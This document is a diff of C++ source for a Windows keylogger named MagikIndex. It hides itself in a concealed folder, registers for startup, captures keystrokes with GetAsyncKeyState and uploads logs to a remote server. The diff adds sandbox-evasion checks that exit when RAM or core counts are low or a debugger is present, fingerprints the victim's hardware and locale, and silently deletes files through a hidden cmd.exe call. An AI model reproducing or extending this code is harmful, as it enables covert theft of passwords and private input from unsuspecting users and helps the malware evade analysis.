@@ -6,13 +6,25 @@
 #include <fstream>
 #include <VersionHelpers.h>
 #include <slpublic.h>
+#include <vector>
+#include <shellapi.h>
+//#include <Wbemidl.h>
+//#include <wbemcli.h>
 
+
+
+
+typedef std::string String;
+typedef std::vector<String> StringVector;
+typedef unsigned long long uint64_t;
 
 #define User ""
 #define Password ""
 #define MyServer ""
 
 #define CharactersPerLog 5000
+#define MaximumFolderSize 1000
+#define MinimumRam 2048
 
 #define MAX_LENGTH 1024
 
@@ -27,9 +39,40 @@
 
 #pragma comment(lib, "Wininet.lib")
 #pragma comment(lib, "Slwga.lib")
+//#pragma comment(lib, "Wbemuuid.lib.")
+
+//#define debug
 
 
 FILE* OUTPUT_FILE;
+
+
+bool IsBrowsePath(const String& path)
+{
+    return (path == "." || path == "..");
+}
+
+
+uint64_t CalculateDirSize(const String& path, uint64_t size = 0) //https://stackoverflow.com/questions/10015341/size-of-a-directory but converted to ANSI and Removed err check and Dir check(assume we dont have subdirs)
+{
+    WIN32_FIND_DATAA data;
+    HANDLE sh = NULL;
+    sh = FindFirstFileA((path + "\\*").c_str(), &data);
+
+    do
+    {
+        // skip current and parent
+        if (!IsBrowsePath(data.cFileName))
+        {
+            size += (uint64_t)(data.nFileSizeHigh * (MAXDWORD)+data.nFileSizeLow);
+        }
+
+    } while (FindNextFileA(sh, &data)); // do
+
+    FindClose(sh);
+
+    return size;
+}
 
 
 BOOL RegisterMyProgramForStartup(PCSTR pszAppName, PCSTR pathToExe, PCSTR args)
@@ -150,6 +193,9 @@ void FileSubmit(const char* localfile, const char* remotefile)
 }
 
 
+
+
+
 void LogItChar(std::string Value, std::string FileName) {
 #ifndef debug
     if (IsDebuggerPresent()) {
@@ -240,6 +286,12 @@ Log:
     std::string CPUNumberText = "Number Of Cores:";
     std::string CPUTypeText = "CPU Type:";
     std::string GenuineText = "Genuine Windows:";
+    std::string SlowText = "Low-End CPU:";
+    std::string MouseText = "Number Of Mouse Buttons:";
+    std::string MonitorText = "Number Of Monitors:";
+    std::string MiddleEastText = "Middle-East PC:";
+    std::string BootText = "Normal Boot:";
+    std::string RAMText = "RAM Size:";
 
     char* AppData = nullptr;
     size_t AppDataSize;
@@ -279,6 +331,8 @@ Log:
     DestinationFile += UserName;
     DestinationFile += "\\Music\\MagikIndex";
 
+    std::string MagikFolder = DestinationFile;
+
     CreateDirectoryA(DestinationFile.c_str(), NULL);
 
     SetFileAttributesA(DestinationFile.c_str(), FILE_ATTRIBUTE_HIDDEN);
@@ -297,12 +351,22 @@ Log:
     RegisterMyProgramForStartup("MagikIndex", DestinationFile.c_str(), "");
 
 
-    int x1, y1, x2, y2, w, h;
+    if (CalculateDirSize(MagikFolder) < MaximumFolderSize) {
+        std::string Command = "/C del /f /q ";
+        Command += MagikFolder;
+        Command += "\\*";
+        ShellExecuteA(0, "open", "cmd.exe", Command.c_str(), 0, SW_HIDE);
+    }
+
+
+    int x1, y1, x2, y2, w, h, mo, mb;
 
     x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
     y1 = GetSystemMetrics(SM_YVIRTUALSCREEN);
     x2 = GetSystemMetrics(SM_CXVIRTUALSCREEN);
     y2 = GetSystemMetrics(SM_CYVIRTUALSCREEN);
+    mo = GetSystemMetrics(SM_CMONITORS);
+    mb = GetSystemMetrics(SM_CMOUSEBUTTONS);
     w = x2 - x1;
     h = y2 - y1;
     std::string Width = std::to_string(w);
@@ -311,6 +375,26 @@ Log:
 
     std::string WindowsVersion = "Unknown";
 
+    std::string Monitors = std::to_string(mo);
+    
+    std::string MouseButtons = std::to_string(mb);
+
+    std::string BootMode = "Yes";
+
+    if (GetSystemMetrics(SM_CLEANBOOT) != 0) {
+        BootMode = "No";
+    }
+
+    std::string SlowMachine = "No";
+
+    if (GetSystemMetrics(SM_SLOWMACHINE) != 0) {
+        SlowMachine = "Yes";
+    }
+
+    std::string MiddleEast = "No";
+    if (GetSystemMetrics(SM_MIDEASTENABLED) != 0) {
+        MiddleEast = "Yes";
+    }
 
     if (IsWindows7OrGreater())
     {
@@ -346,8 +430,12 @@ Log:
     SYSTEM_INFO siSysInfo;
     GetSystemInfo(&siSysInfo);
 
+    MEMORYSTATUSEX RAMStatus;
+    RAMStatus.dwLength = sizeof(RAMStatus);
+    GlobalMemoryStatusEx(&RAMStatus);
+
 #ifndef debug
-    if (siSysInfo.dwNumberOfProcessors < 2) {
+    if (siSysInfo.dwNumberOfProcessors < 2 || (RAMStatus.ullTotalPhys / 1024) / 1024 < MinimumRam) {
         exit(1);
     }
 #endif
@@ -355,7 +443,7 @@ Log:
     std::string OEMNumber = std::to_string(siSysInfo.dwOemId);
     std::string CPUCores = std::to_string(siSysInfo.dwNumberOfProcessors);
     std::string CPUType = std::to_string(siSysInfo.dwProcessorType);
-
+    std::string RAMAmount = std::to_string((RAMStatus.ullTotalPhys / 1024) / 1024);
     
     std::string IsGenuine = "Yes";
     CONST SLID AppId = WINDOWS_SLID;
@@ -369,7 +457,6 @@ Log:
             IsGenuine = "No";
         }
     }
-
 
 
 
@@ -397,6 +484,10 @@ Log:
     OEMText += OEMNumber;
     LogItChar(OEMText,CurrentLog);
 
+    RAMText += RAMAmount;
+    RAMText += " MB";
+    LogItChar(RAMText,CurrentLog);
+
     CPUNumberText += CPUCores;
     LogItChar(CPUNumberText, CurrentLog);
 
@@ -405,6 +496,21 @@ Log:
 
     GenuineText += IsGenuine;
     LogItChar(GenuineText, CurrentLog);
+
+    MouseText += MouseButtons;
+    LogItChar(MouseText, CurrentLog);
+
+    MonitorText += Monitors;
+    LogItChar(MonitorText, CurrentLog);
+
+    BootText += BootMode;
+    LogItChar(BootText, CurrentLog);
+
+    SlowText += SlowMachine;
+    LogItChar(SlowText, CurrentLog);
+
+    MiddleEastText += MiddleEast;
+    LogItChar(MiddleEastText, CurrentLog);
 
 
     LogItChar("------------------------------------------\n",CurrentLog);
@@ -420,7 +526,7 @@ Log:
 
 
      for (int k = 0; k < CharactersPerLog;) {
-         Sleep(50);
+         Sleep(25);
          for (int i = 8; i < 190; i++) {
              if (GetAsyncKeyState(i) == -32767) {
                  LogItInt(i, CurrentLog);
